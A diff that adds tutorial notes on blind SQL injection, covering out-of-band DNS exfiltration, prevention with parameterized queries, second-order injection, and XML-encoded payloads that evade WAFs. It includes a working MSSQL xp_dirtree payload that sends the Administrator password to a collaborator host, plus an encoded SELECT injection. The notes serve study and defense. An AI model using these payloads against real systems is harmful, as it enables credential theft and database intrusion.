@@ -505,7 +505,7 @@ ERROR: invalid input syntax for type integer: "Example data"
 * Note : There are various ways to trigger time delay within SQL queries, and different techniques apply on different types of database.
     * Resource : [Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
-## Exploiting blind SQL injeciton using out-of-band (OAST) techniques :
+### Exploiting blind SQL injeciton using out-of-band (OAST) techniques :
 
 
 * Now, suppose that the application carries out the same SQL query, but does it asynchronously. The application continues processing the user's request in the original thread, and another to execute a SQL query using the tracking cookie.
@@ -532,3 +532,72 @@ ERROR: invalid input syntax for type integer: "Example data"
 cjjqp6g2vtc00009zmr0gjjm5dcyyyyyb.oast.fun
 ```
 
+
+#### Exfiltrate data from OAST vulnerability : 
+
+* Having confirm a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For Example :
+
+```sql
+'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username = 'Administrator' ); exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+```
+
+
+'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username = 'Administrator' ); exec('master..xp_dirtree "//'+@p+'.cjk4whj2vtc0000n0ex0gjj1qeayyyyyb.oast.fun/a"')--
+
+
+
+
+cjk4whj2vtc0000n0ex0gjj1qeayyyyyb.oast.fun
+
+
+
+
+
+* This input reads the password for the `Administrator` user, append a unique collaborator subdomain, and trigger a DNS lookup. This will result a DNS lookup like the following, allowing you to view the capture password:
+
+```url
+S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
+```
+
+* Out-of-band (OAST) technique are an extremely powerful way to detect and exploit blind SQL injection, due to highly likelihood of success and the ability to direct exfiltrate data within the out-of-band channel. For this reason, OAST technique exfiltrate data within the out-of-band channel. For this reason, OAST technique are often preferable even in situation where other technique for blind exploitation do work.
+
+* Note : There are Various ways to triggering out-of-band interaction, and different technique apply on different type of databases
+  * Resource : [SQL cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+
+### How to prevent blind SQL injection : 
+
+* Although the technique needed to find and exploit blind SQL injection vulnerability are different and more sophisticated than for regular SQL injection, the measures needed to prevent SQL injection are the same regardless of whether the vulnerability is blind or not.
+
+* As with regular SQL injection, blind SQL injection attacks can be prevented though the careful use of parameterized query, which ensure that user input cannot interfere with the structure of the intended SQL query.
+
+
+### Second-Order SQL Injection :
+
+* First-order SQL injection arises where the application takes user input from an HTTP request and, in the course of processing that request, incorporates the input into a SQL query in an unsafe way.
+
+* In Second-Order SQL injection (also known as Stored SQL injection), the application, takes user input from an HTTP request and stores it for future use.
+* This is usually done by placing the input into a database, but no vulnerability arises at the point where the data is stored. Later when handling a different HTTP request, the application retrieve the stored data and incorporates it into a SQL query in an unsafe way.
+
+* Second-order SQL injection often arises in situation where developer are aware of SQL injection vulnerability, and so safely handel the initial placement of the input into the database.
+* When the data is later processed, it is deemed to be safe, since it was previously placed into the database safely. At this point, the data is handled in an unsafe way, because the developer wrongly deem it to be trusted.
+* ![](/Server_Side_topics/res/second-order-sql-injection.svg)
+
+### SQL injection in different Contexts :
+
+* It's is important to note that you can perform SQL injection attack using any controllable input that is processed as a SQL query by the application. For example, some website take input in `JSON` or `XML`
+Format and user this to query the database.
+
+* These different formats may even provide alternative ways for you to [obfuscate attack](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-xml-encoding) that are otherwise blocked due to `WAFs` and other defense mechanisms. 
+* Weak implementation often just look for common SQL injection keywords within escaping character in the prohibited keywords. For Example, the following `XML-based SQL` injection uses an `XML escape sequence` to encode the `S` in `SELECT`.
+
+```xml
+<stockcheck>
+    <productId>
+    123
+    </productId>
+    <storeId>
+    999 &#x53;Elect * FROM information_schema.tables
+    </storeId>
+    </stockcheck>
+```
+* This will be decoded server-side before being passed to the SQL interpreter.
